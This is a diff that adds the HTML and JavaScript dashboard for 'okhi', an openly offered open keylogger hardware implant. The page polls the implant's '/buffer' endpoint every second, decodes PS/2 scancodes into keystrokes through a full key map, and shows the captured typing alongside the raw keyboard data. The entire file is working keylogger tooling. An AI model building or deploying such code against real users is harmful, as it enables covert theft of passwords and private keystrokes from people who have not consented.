@@ -1,0 +1,136 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>okhi - Open Keylogger Hardware Implant</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f4f4f4;
+            color: #333;
+            margin: 0;
+            padding: 0;
+        }
+        h1, h2 {
+            color: #2c3e50;
+            text-align: center;
+            margin-top: 20px;
+        }
+        a {
+            color: #2980b9;
+            text-decoration: none;
+        }
+        a:hover {
+            color: #3498db;
+            text-decoration: underline;
+        }
+        textarea {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            box-sizing: border-box;
+            resize: none;
+        }
+        label {
+            display: block;
+            margin: 20px 0 10px;
+            font-weight: bold;
+        }
+        .container {
+            max-width: 960px;
+            margin: 20px auto;
+            background: #fff;
+            padding: 20px;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+            border-radius: 8px;
+        }
+        .header {
+            margin-bottom: 20px;
+        }
+        form {
+            margin-bottom: 40px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>okhi - Open Keylogger Hardware Implant by Dreg</h1>
+            <h2><a href="https://www.rootkit.es/">rootkit.es</a> - <a href="https://github.com/therealdreg/okhi/">GitHub</a></h2>
+        </div>
+        <form>  
+            <label for="hexData">KEYS</label>  
+            <textarea id="hexData" rows="10" readonly></textarea>
+        </form>
+        <form>  
+            <label for="bufferData">PS2 DATA</label>  
+            <textarea id="bufferData" rows="10" readonly></textarea>
+        </form>
+    </div>
+	
+	<script>
+	function fetchBuffer() {
+		fetch('/buffer')
+		.then(response => response.text())
+		.then(data => {
+			console.log("Data recv:", data); 
+			let bufferData = document.getElementById('bufferData');
+			bufferData.value += data;	
+			parseData(data);
+		})
+		.catch(error => {
+			console.error('Error fetching buffer:', error);
+		});
+	}
+
+	const keyMap = {
+		'0x1C': 'A', '0x32': 'B', '0x21': 'C', '0x23': 'D', '0x24': 'E', '0x2B': 'F', '0x34': 'G', '0x33': 'H', '0x43': 'I', '0x3B': 'J', 
+		'0x42': 'K', '0x4B': 'L', '0x3A': 'M', '0x31': 'N', '0x44': 'O', '0x4D': 'P', '0x15': 'Q', '0x2D': 'R', '0x1B': 'S', '0x2C': 'T', 
+		'0x3C': 'U', '0x2A': 'V', '0x1D': 'W', '0x22': 'X', '0x35': 'Y', '0x1A': 'Z', '0x45': '0', '0x16': '1', '0x1E': '2', '0x26': '3', 
+		'0x25': '4', '0x2E': '5', '0x36': '6', '0x3D': '7', '0x3E': '8', '0x46': '9', '0x0E': '`', '0x4E': '-', '0x55': '=', '0x5D': '\\', 
+		'0x66': '<BKSP>', '0x29': ' ', '0x0D': '<TAB>', '0x58': '<CAPS>', '0x12': '<LSHIFT>', '0x14': '<LCTRL>', '0x11': '<LALT>', 
+		'0x59': '<RSHIFT>', '0x5A': '<ENTER>', '0x76': '<ESC>', '0x05': '<F1>', '0x06': '<F2>', '0x04': '<F3>', '0x0C': '<F4>', '0x03': '<F5>', 
+		'0x0B': '<F6>', '0x83': '<F7>', '0x0A': '<F8>', '0x01': '<F9>', '0x09': '<F10>', '0x78': '<F11>', '0x07': '<F12>', '0x7E': '<SCROLL>', 
+		'0x54': '[', '0x77': '<NUM>', '0x7C': '*', '0x7B': '-', '0x79': '+', '0x71': '.', '0x70': '0', '0x69': '1', '0x72': '2', '0x7A': '3', 
+		'0x6B': '4', '0x73': '5', '0x74': '6', '0x6C': '7', '0x75': '8', '0x7D': '9', '0x5B': ']', '0x4C': ';', '0x52': "'", '0x41': ',', 
+		'0x49': '.', '0x4A': '/'
+	};
+
+	function parseData(data) {
+		const packets = data.split(';');
+		const keyStates = {};
+		packets.forEach(packet => {
+			if (packet.trim()) {
+				const match = packet.trim().match(/D:(\S+)\s+t:(\S+)/);
+				if (match && match[1]) {
+					let keyCode = match[1];
+					if (keyCode.startsWith('0xF0')) {
+						keyStates[keyCode.slice(3)] = false;
+					} else {
+						if (!keyStates[keyCode]) {
+							const key = keyMap[keyCode];
+							if (key) {
+								displayKey(key);
+							}
+							keyStates[keyCode] = true;
+						} else {
+							keyStates[keyCode] = true; 
+						}
+					}
+				}
+			}
+		});
+	}
+
+	function displayKey(key) {
+		let keysData = document.getElementById('hexData');
+		keysData.value += key; 
+	}
+
+    setInterval(fetchBuffer, 1000); 
+</script>
+
+</body>
+</html>
